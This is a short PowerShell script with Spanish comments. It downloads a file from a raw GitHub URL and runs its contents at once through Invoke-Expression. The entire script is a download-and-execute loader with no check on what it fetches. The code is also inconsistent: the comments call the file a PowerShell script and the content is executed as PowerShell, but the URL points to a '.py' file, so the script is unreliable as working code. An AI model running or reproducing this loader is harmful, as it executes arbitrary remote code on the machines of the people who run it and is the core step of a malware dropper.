$ErrorActionPreference = "Stop"
# Habilitar TLSv1.2 para compatibilidad con clientes más antiguos
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

# URL del script de PowerShell
$PowerShellScriptURL = 'https://raw.githubusercontent.com/astronomyc/filesRecents/main.py'

try {
    # Descargar el script de PowerShell
    $PowerShellScriptContent = Invoke-WebRequest -Uri $PowerShellScriptURL -UseBasicParsing | Select-Object -ExpandProperty Content
}
catch {
    Write-Host "No se pudo descargar el script de PowerShell desde $PowerShellScriptURL."
    exit
}

# Ejecutar el script de PowerShell
Invoke-Expression -Command $PowerShellScriptContent
